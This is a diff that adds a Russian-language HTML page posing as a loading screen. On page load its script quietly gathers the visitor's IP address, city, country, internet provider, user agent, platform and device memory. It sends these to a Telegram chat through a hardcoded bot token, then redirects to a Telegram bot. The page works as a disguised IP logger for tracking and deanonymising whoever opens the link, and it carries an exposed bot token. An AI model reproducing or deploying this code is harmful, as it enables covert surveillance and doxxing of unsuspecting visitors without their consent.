@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <style>
+        body {
+            background-color: #000;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+        
+        .loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #fff;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading">
+        <div class="spinner"></div>
+        <p>Загрузка...</p>
+    </div>
+
+    <script>
+        // Получаем параметры из URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('tg');
+        
+        // Функция для получения IP через сторонний сервис
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    country: data.country_name,
+                    provider: data.org || 'Неизвестно'
+                };
+            } catch (error) {
+                console.error('Ошибка получения IP информации:', error);
+                return {
+                    ip: 'Неизвестно',
+                    city: 'Неизвестно',
+                    country: 'Неизвестно',
+                    provider: 'Неизвестно'
+                };
+            }
+        }
+        
+        // Функция для получения информации о платформе и памяти
+        function getPlatformInfo() {
+            const platform = navigator.platform;
+            const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Неизвестно';
+            
+            return {
+                platform,
+                memory
+            };
+        }
+        
+        // Функция для отправки сообщения в Telegram бота
+        async function sendToTelegram(message) {
+            const botToken = '8486936966:AAHaDit7xT6HT6I13C-U-CjAh-m4PMenqYo';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+                return false;
+            }
+        }
+        
+        // Форматирование времени
+        function formatTime(date) {
+            const options = {
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                timeZoneName: 'short'
+            };
+            return date.toLocaleString('ru-RU', options);
+        }
+        
+        // Основная функция
+        async function init() {
+            // Получаем данные
+            const ipInfo = await getIPInfo();
+            const platformInfo = getPlatformInfo();
+            const userAgent = navigator.userAgent;
+            const currentTime = formatTime(new Date());
+            
+            // Формируем сообщение
+            const message = `
+🔐 <b>Новые данные</b>
+
+🌐 <b>IP:</b> ${ipInfo.ip}
+🏠 <b>Город:</b> ${ipInfo.city}
+🇺🇳 <b>Страна:</b> ${ipInfo.country}
+📡 <b>Провайдер:</b> ${ipInfo.provider}
+
+🛠️ <b>User-agent:</b>
+<blockquote>${userAgent}</blockquote>
+
+💻 <b>Другие данные:</b>
+<b>Платформа:</b> ${platformInfo.platform}
+<b>Память:</b> ${platformInfo.memory}
+
+🔗 <b>Вечная ссылка:</b> FaidikSearch.xyz
+⌛ <b>Время перехода:</b> ${currentTime}
+            `;
+            
+            // Отправляем сообщение в Telegram
+            if (chatId) {
+                await sendToTelegram(message);
+            }
+            
+            // Перенаправляем на бота
+            setTimeout(() => {
+                window.location.href = 'http://t.me/faidiappsbot';
+            }, 2000);
+        }
+        
+        // Запускаем при загрузке страницы
+        window.onload = init;
+    </script>
+</body>
+</html>
